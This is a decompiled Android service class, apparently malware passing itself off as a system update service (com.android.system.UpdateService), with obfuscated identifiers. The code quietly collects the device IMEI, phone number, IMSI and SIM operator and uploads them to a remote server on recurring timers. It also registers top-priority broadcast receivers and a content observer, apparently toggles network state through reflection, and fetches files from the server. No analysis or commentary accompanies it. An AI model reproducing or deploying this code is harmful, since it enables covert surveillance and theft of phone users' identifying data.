package com.android.system;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.a.a.a.b;
import com.a.a.a.c;
import com.a.a.a.d;
import com.a.a.a.e;
import com.android.a.C0001b;
import com.android.xb.start.start;
import com.nineoldandroids.animation.ValueAnimator;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

@SuppressLint({"HandlerLeak"})
/* loaded from: classes.dex */
public class UpdateService extends Service implements Handler.Callback {
    public static String a = null;
    public static Handler b;
    public static String c;
    public static UpdateService d;
    private static boolean i;
    private static String s;
    private static String t;
    private static String w;
    private boolean e;
    private a g;
    private SharedPreferences h;
    private com.a.a.b.a j;
    private TelephonyManager k;
    private JSONObject l;
    private int m;
    private int n;
    private boolean o;
    private boolean p;
    private int q;
    private long r;
    private int u;
    private ArrayList f = new ArrayList();
    private String v = d.b;

    static {
        String str = d.b;
        String str2 = d.b;
        c = C0001b.d(com.a.a.a.a.P);
        s = d.b;
        t = d.b;
        w = d.b;
    }

    private static String a(Context context, String str) {
        ApplicationInfo applicationInfo;
        String string = null;
        if (context == null || TextUtils.isEmpty(str)) {
            return null;
        }
        try {
            PackageManager packageManager = context.getPackageManager();
            if (packageManager == null || (applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), 128)) == null || applicationInfo.metaData == null) {
                return null;
            }
            string = applicationInfo.metaData.getString(str);
            String[] strArrSplit = string.split("-");
            s = strArrSplit[0];
            t = strArrSplit[1];
            return string;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return string;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static void a(Context context) {
        File[] fileArrListFiles;
        File dir = context.getDir(b.m, 0);
        if (!dir.exists() || (fileArrListFiles = dir.listFiles()) == null || fileArrListFiles.length <= 0) {
            return;
        }
        String name = fileArrListFiles[0].getName();
        if (TextUtils.isEmpty(name)) {
            return;
        }
        com.a.a.b.a.a().a(String.valueOf(b.b) + b.e, b, name, 0);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(Handler handler, Context context) throws JSONException, IllegalAccessException, NoSuchFieldException, NoSuchMethodException, SecurityException, IllegalArgumentException, InvocationTargetException {
        this.l = a();
        b.removeMessages(2);
        JSONObject jSONObject = new JSONObject();
        e();
        try {
            jSONObject.put(b.u, w);
            jSONObject.put(b.v, s);
            jSONObject.put(b.w, t);
            jSONObject.put(b.x, 0);
            jSONObject.put(b.A, this.h.getString(b.q, ""));
            jSONObject.put(b.y, d.b);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        b();
        c();
        d();
        int iCurrentTimeMillis = (int) (((System.currentTimeMillis() - this.r) / 1000) / 60);
        if (!com.a.a.b.a.a(this)) {
            f();
            return;
        }
        if (this.p) {
            if (iCurrentTimeMillis < 4) {
                C0001b.a(context, b.h, System.currentTimeMillis() + ((5 - iCurrentTimeMillis) * 60 * 1000));
                return;
            }
            this.p = false;
            this.j.a(new com.a.a.b.d(String.valueOf(b.b) + b.d, 3, false), handler, jSONObject);
            getSharedPreferences(b.E, 0).edit().putLong(b.J, System.currentTimeMillis()).commit();
            return;
        }
        if (this.o) {
            if (iCurrentTimeMillis <= 29) {
                C0001b.a(context, b.h, System.currentTimeMillis() + ((30 - iCurrentTimeMillis) * 60 * 1000));
                return;
            }
            this.o = false;
            this.j.a(new com.a.a.b.d(String.valueOf(b.b) + b.d, 3, false), handler, jSONObject);
            getSharedPreferences(b.E, 0).edit().putLong(b.J, System.currentTimeMillis()).commit();
            return;
        }
        if (this.q == 1) {
            if (iCurrentTimeMillis >= 359) {
                this.j.a(new com.a.a.b.d(String.valueOf(b.b) + b.d, 3, false), handler, jSONObject);
                C0001b.a(context, b.h, System.currentTimeMillis() + 1800000);
                getSharedPreferences(b.E, 0).edit().putLong(b.J, System.currentTimeMillis()).commit();
                return;
            } else if (iCurrentTimeMillis >= 330) {
                C0001b.a(context, b.h, System.currentTimeMillis() + ((30 - (iCurrentTimeMillis % 30)) * 60 * 1000));
                return;
            } else {
                C0001b.a(context, b.h, System.currentTimeMillis() + 1800000);
                return;
            }
        }
        if (this.u == 1) {
            if (iCurrentTimeMillis >= 179) {
                this.j.a(new com.a.a.b.d(String.valueOf(b.b) + b.d, 3, false), handler, jSONObject);
                C0001b.a(context, b.h, System.currentTimeMillis() + 1800000);
                getSharedPreferences(b.E, 0).edit().putLong(b.J, System.currentTimeMillis()).commit();
                return;
            } else if (iCurrentTimeMillis >= 150) {
                C0001b.a(context, b.h, System.currentTimeMillis() + ((30 - (iCurrentTimeMillis % 30)) * 60 * 1000));
                return;
            } else {
                C0001b.a(context, b.h, System.currentTimeMillis() + 1800000);
                return;
            }
        }
        if (this.n > 1) {
            if (iCurrentTimeMillis <= 29) {
                C0001b.a(context, b.h, System.currentTimeMillis() + ((30 - iCurrentTimeMillis) * 60 * 1000));
                return;
            }
            this.j.a(new com.a.a.b.d(String.valueOf(b.b) + b.d, 3, false), handler, jSONObject);
            C0001b.a(context, b.h, System.currentTimeMillis() + 1800000);
            if (this.h == null) {
                this.h = getSharedPreferences(b.E, 0);
            }
            this.h.edit().putLong(b.J, System.currentTimeMillis()).commit();
            return;
        }
        if (iCurrentTimeMillis < 59) {
            if (iCurrentTimeMillis >= 30) {
                C0001b.a(context, b.h, System.currentTimeMillis() + ((60 - iCurrentTimeMillis) * 60 * 1000));
                return;
            } else {
                C0001b.a(context, b.h, System.currentTimeMillis() + ((60 - iCurrentTimeMillis) * 30 * 1000));
                return;
            }
        }
        this.j.a(new com.a.a.b.d(String.valueOf(b.b) + b.d, 3, false), handler, jSONObject);
        C0001b.a(context, b.h, System.currentTimeMillis() + 1800000);
        if (this.h == null) {
            this.h = getSharedPreferences(b.E, 0);
        }
        this.h.edit().putLong(b.J, System.currentTimeMillis()).commit();
    }

    private void a(String str) throws JSONException, IOException {
        String strA = C0001b.a(String.valueOf(b.a) + File.separator + str + b.p);
        this.f.clear();
        try {
            JSONArray jSONArray = new JSONArray(strA);
            int length = jSONArray.length();
            for (int i2 = 0; i2 < length; i2++) {
                JSONObject jSONObject = jSONArray.getJSONObject(i2);
                if (jSONObject.getString(b.L).equals(String.valueOf(0))) {
                    c cVar = new c();
                    int i3 = jSONObject.getInt(b.N);
                    cVar.a = jSONObject.getString(b.o);
                    cVar.b = jSONObject.getString(b.M);
                    for (int i4 = 0; i4 < i3; i4++) {
                        this.f.add(cVar);
                    }
                }
            }
            if (this.f.size() > 0) {
                c cVar2 = (c) this.f.remove(0);
                com.a.a.c.c.a(this, cVar2.a, cVar2.b, c);
            }
        } catch (JSONException e) {
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void b() {
        if (this.h == null) {
            this.h = getSharedPreferences(b.E, 0);
        }
        this.r = this.h.getLong(b.J, 0L);
    }

    private void c() {
        if (this.h == null) {
            this.h = getSharedPreferences(b.E, 0);
        }
        this.u = this.h.getInt(b.K, 0);
    }

    private void d() {
        if (this.h == null) {
            this.h = getSharedPreferences(b.E, 0);
        }
        this.q = this.h.getInt(b.I, 0);
    }

    private void e() {
        a(this, b.r);
    }

    private void f() throws IllegalAccessException, NoSuchFieldException, NoSuchMethodException, SecurityException, IllegalArgumentException, InvocationTargetException {
        com.a.a.b.a.a();
        com.a.a.b.a.a(this, true);
        com.a.a.b.a.a();
        com.a.a.b.a.b(this, false);
    }

    public final JSONObject a() throws JSONException {
        JSONObject jSONObject = new JSONObject();
        this.v = this.k.getDeviceId();
        String line1Number = this.k.getLine1Number();
        if (line1Number == null) {
            line1Number = d.b;
        }
        String subscriberId = this.k.getSubscriberId();
        w = subscriberId;
        if (TextUtils.isEmpty(subscriberId)) {
            w = "";
        }
        String simOperatorName = this.k.getSimOperatorName();
        e();
        try {
            jSONObject.put(b.v, s);
            jSONObject.put(b.w, t);
            jSONObject.put(b.u, w);
            jSONObject.put(b.G, line1Number);
            jSONObject.put(b.H, this.v);
            jSONObject.put(b.F, simOperatorName);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jSONObject;
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    @Override // android.os.Handler.Callback
    public boolean handleMessage(Message message) throws IllegalAccessException, JSONException, NoSuchFieldException, NoSuchMethodException, SecurityException, IOException, IllegalArgumentException, InvocationTargetException {
        switch (message.what) {
            case ValueAnimator.INFINITE /* -1 */:
                if (this.f.size() > 0) {
                    c cVar = (c) this.f.remove(0);
                    com.a.a.c.c.a(this, cVar.a, cVar.b, c);
                }
                return false;
            case 0:
                b.removeMessages(0);
                this.l = a();
                this.e = true;
                Handler handler = b;
                if (com.a.a.b.a.a(getApplicationContext())) {
                    this.j.a(new com.a.a.b.d(String.valueOf(b.b) + b.c, 1, false), handler, this.l);
                } else if (i) {
                    f();
                }
                return false;
            case 1:
                if (com.a.a.c.c.a(this, message) == 0) {
                    this.p = false;
                    a(b, this);
                } else {
                    this.p = true;
                }
                return false;
            case 2:
                a(b, this);
                return false;
            case 3:
                this.l = a();
                this.o = false;
                this.p = false;
                this.n = com.a.a.c.c.a(this, b, message);
                return false;
            case 4:
                a(a);
                return false;
            case 5:
                b.a(getApplicationContext());
                C0001b.a(this, b);
                return false;
            case 6:
                if (this.h == null) {
                    this.h = getSharedPreferences(b.E, 0);
                }
                if (com.a.a.b.a.a(this)) {
                    this.l = a();
                    if (this.e) {
                        this.e = false;
                        b.sendEmptyMessage(0);
                    } else {
                        b.sendEmptyMessage(2);
                    }
                } else {
                    f();
                }
                return false;
            case 7:
                this.o = true;
                if (this.h == null) {
                    this.h = getSharedPreferences(b.E, 0);
                }
                this.h.edit().putLong(b.J, System.currentTimeMillis()).commit();
                a(b, this);
                return false;
            case 200:
                String string = message.obj.toString();
                File dir = getDir(b.m, 0);
                try {
                    if (!dir.exists()) {
                        dir.createNewFile();
                    }
                    File file = new File(dir, string);
                    if (file.exists()) {
                        file.delete();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                a((Context) this);
                return false;
            case 201:
                int i2 = message.arg2 + 1;
                if (i2 < 3) {
                    com.a.a.b.a.a().a(String.valueOf(b.b) + b.e, b, message.obj.toString(), i2);
                }
                return false;
            default:
                return false;
        }
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() throws IllegalAccessException, NoSuchFieldException, NoSuchMethodException, SecurityException, IllegalArgumentException, InvocationTargetException {
        super.onCreate();
        d = this;
        if (!com.a.a.b.a.a(this)) {
            f();
        }
        e();
        c();
        d();
        b();
        this.g = new a(this, (byte) 0);
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.setPriority(Integer.MAX_VALUE);
        intentFilter.addAction(b.aa);
        intentFilter.addAction(b.ab);
        intentFilter.addAction(c);
        intentFilter.addAction(b.ac);
        intentFilter.addAction(b.j);
        registerReceiver(this.g, intentFilter);
        IntentFilter intentFilter2 = new IntentFilter(b.ag);
        intentFilter2.setPriority(Integer.MAX_VALUE);
        registerReceiver(new PopReceiver(), intentFilter2);
        getContentResolver().registerContentObserver(Uri.parse(b.V), true, new e(this, new Handler()));
        this.k = (TelephonyManager) getSystemService(b.ad);
    }

    @Override // android.app.Service
    public void onDestroy() {
        unregisterReceiver(this.g);
        super.onDestroy();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i2, int i3) {
        String action;
        b.a = getFilesDir().getAbsolutePath();
        File file = new File(String.valueOf(b.a) + File.separator);
        if (!file.exists()) {
            file.mkdirs();
        }
        if (b == null) {
            b = new Handler(this);
        }
        this.j = com.a.a.b.a.a();
        b();
        start.init(this);
        if (System.currentTimeMillis() - this.r > 599998) {
            b.sendEmptyMessage(5);
        }
        if (intent != null && (action = intent.getAction()) != null) {
            if (action.equals(b.h)) {
                b.sendEmptyMessage(2);
            } else if (action.equals(b.i)) {
                b.sendEmptyMessage(-1);
            }
        }
        return super.onStartCommand(intent, 1, i3);
    }
}
